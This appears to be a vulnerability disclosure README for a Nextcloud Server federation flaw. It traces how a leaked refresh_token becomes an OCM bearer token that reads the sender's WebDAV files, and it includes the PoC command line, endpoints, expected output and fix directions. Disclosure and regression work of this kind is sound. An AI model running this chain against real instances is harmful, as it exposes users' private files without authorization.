# Nextcloud Federated Share Bearer Token PoC

This entry documents and exercises a token-scope flaw in Nextcloud Server federation.

A sender who creates a normal federated file share causes the sender instance to create a permanent authentication token. The recipient instance exposes that value as `refresh_token` through the pending remote-share API. The sender token endpoint accepts that value and returns an OCM bearer token. That bearer is then accepted by the sender WebDAV endpoint as the sender user and can read sender files outside the federated share.

## Affected Target

- Product: Nextcloud Server
- Version verified: `35.0.0 dev`
- Build version verified: `35.0.0.1`
- Commit tested: `d9027189329b6b13159d480f7d5e36444badde13`
- Feature path: federated file sharing, OCM token exchange, WebDAV bearer authentication
- Required attacker account: a normal local account on the recipient instance
- Required sender action: create one federated file share to the attacker account

## Impact

The chain turns a single federated file share into sender-account WebDAV access.

The recipient account can read its pending remote-share records and obtain the sender-side `refresh_token`. Exchanging that value returns a bearer token whose WebDAV session maps to the sender account. The bearer can fetch arbitrary sender WebDAV paths available to that account, including files outside the one item shared through federation.

## Source Trace

Relevant source locations in Nextcloud Server `35.0.0.1`:

| File | Behavior |
| --- | --- |
| `apps/federatedfilesharing/lib/FederatedShareProvider.php` | Creates a permanent token for the sender user during federated share creation |
| `apps/federatedfilesharing/lib/FederatedShareProvider.php` | Stores the same token as the federated share secret |
| `lib/private/Authentication/Token/PublicKeyTokenProvider.php` | Applies a token scope only when the caller supplies one |
| `lib/private/Authentication/Token/PublicKeyToken.php` | Defaults token scope to filesystem access |
| `apps/files_sharing/lib/External/ExternalShare.php` | Serializes pending remote shares with `refresh_token` |
| `apps/files_sharing/appinfo/routes.php` | Exposes `/remote_shares/pending` through the OCS sharing API |
| `apps/cloud_federation_api/lib/Controller/TokenController.php` | Accepts a permanent token as an authorization-code value |
| `apps/cloud_federation_api/lib/Controller/TokenController.php` | Generates an OCM access token without a filesystem-denying scope |
| `lib/private/User/Session.php` | Accepts bearer tokens named as OCM access tokens for WebDAV sessions |
| `apps/dav/lib/Connector/Sabre/BearerAuth.php` | Applies bearer authentication to WebDAV requests |

The sender token creation path is:

```text
FederatedShareProvider::createFederatedShare
  PublicKeyTokenProvider::generateToken
    type = PERMANENT_TOKEN
    scope = caller default
  addShareToDB
    token = same generated value
```

The attacker-visible leak path is:

```text
GET /ocs/v2.php/apps/files_sharing/api/v1/remote_shares/pending
  RemoteController::getOpenShares
    ExternalShare::jsonSerialize
      refresh_token = sender share token
```

The bearer creation and WebDAV path is:

```text
POST /index.php/apps/cloud_federation_api/api/v1/access-token
  TokenController::accessToken
    tokenProvider->getToken(refresh_token)
    shareManager->getShareByToken(refresh_token)
    generateToken(access_token, sender uid, OCM access token name)

GET /remote.php/dav/files/<sender>/<path>
  BearerAuth
    User\Session bearer-token auth
      sender filesystem session
```

## PoC Design

`poc.py` drives the stock HTTP interfaces. It:

1. Creates a federated file share from the sender instance to the recipient account.
2. Reads the recipient pending remote-share API.
3. Extracts the newest matching `refresh_token`.
4. Exchanges the token at the sender OCM token endpoint.
5. Uses the returned bearer token against the sender WebDAV endpoint.
6. Prints and saves the WebDAV response for a sender file outside the shared item.

The script uses Python standard library APIs only.

## Requirements

- Python 3.10 or newer
- Two running Nextcloud Server instances from the tested source tree or release line
- `files_sharing`, `federatedfilesharing`, `cloud_federation_api`, and `dav` enabled
- One sender user with one file to share
- One recipient user on a second instance
- One additional sender file for the WebDAV proof
- Local or lab TLS trust configured for the two instances, or `--insecure` for a self-signed local pair

## Quick Run

Example local validation users:

- sender instance: `https://127.0.0.1:18880`
- recipient instance: `https://127.0.0.1:18881`
- sender user: `victim`
- recipient user: `attacker`
- shared file: `/shared.txt`
- proof file: `/secret.txt`

For a compact local two-instance validation pair, keep sender federation delivery on the classic share receiver with the stock app config value:

```bash
php occ config:app:set core ocm_discovery_enabled --value=false --type=boolean
```

Run:

```bash
python poc.py \
  --sender-base https://127.0.0.1:18880 \
  --recipient-base https://127.0.0.1:18881 \
  --sender-user victim \
  --sender-password 'VictimPass123!' \
  --recipient-user attacker \
  --recipient-password 'AttackerPass123!' \
  --share-path /shared.txt \
  --proof-path /secret.txt \
  --insecure \
  --timeout 90 \
  --output proof.json
```

Expected output shape:

```json
{
  "createShare": {
    "httpStatus": 200,
    "ocsStatus": 200,
    "shareId": "10",
    "tokenPreview": "8tQhWc8gU...GkVUaE"
  },
  "pendingShare": {
    "id": "102151152757424128",
    "refreshTokenLength": 32,
    "refreshTokenPreview": "8tQhWc8gU...GkVUaE",
    "remoteId": "10"
  },
  "tokenExchange": {
    "accessTokenPreview": "eyJ0eXAiO...F72ng",
    "expiresIn": 3600,
    "httpStatus": 200,
    "tokenType": "Bearer"
  },
  "webdavProof": {
    "body": "PRIVATE VICTIM SECRET\n",
    "contentLength": 81,
    "httpStatus": 200,
    "xUserId": "victim"
  }
}
```

## Validation Run

The validation run used clean stock Nextcloud Server checkouts at `d9027189329b6b13159d480f7d5e36444badde13`, reporting `35.0.0 dev` and build version `35.0.0.1`.

The sender instance ran at `https://127.0.0.1:18880` with user `victim`. The recipient instance ran at `https://127.0.0.1:18881` with user `attacker`. Both instances used the bundled apps listed above, SQLite, and local TLS. The sender app config value `core:ocm_discovery_enabled` was set to `false` for the local run so share delivery completed through the stock classic federated share receiver.

Sender files:

```text
/shared.txt
/secret.txt
```

Only `/shared.txt` was shared to:

```text
attacker@https://127.0.0.1:18881
```

The federated share request returned:

```text
HTTP/1.1 200 OK
OCS statuscode: 200
share id: 10
```

The recipient pending remote-share API returned a matching entry containing:

```text
remote: https://127.0.0.1:18880/
remote_id: 10
user: attacker
refresh_token: 32-byte sender share token
```

The token exchange returned:

```text
HTTP/1.1 200 OK
token_type: Bearer
expires_in: 3600
```

Using the returned bearer against the sender WebDAV endpoint returned:

```text
GET /remote.php/dav/files/victim/secret.txt
HTTP/1.1 200 OK
X-User-Id: victim
```

The response body was:

```text
PRIVATE VICTIM SECRET
```

## Fix Direction

- Create federated share refresh tokens with a purpose-specific scope.
- Bind exchanged OCM access tokens to the federated share id, shared node, and allowed permissions.
- Remove sender refresh tokens from recipient-facing OCS responses.
- Enforce OCM token scope inside WebDAV bearer authentication.
- Add regression coverage for exchanging a federated share secret and then requesting an unrelated sender path.

## Responsible Use

Use this PoC only for systems you own, systems you are authorized to test, and defensive regression work.
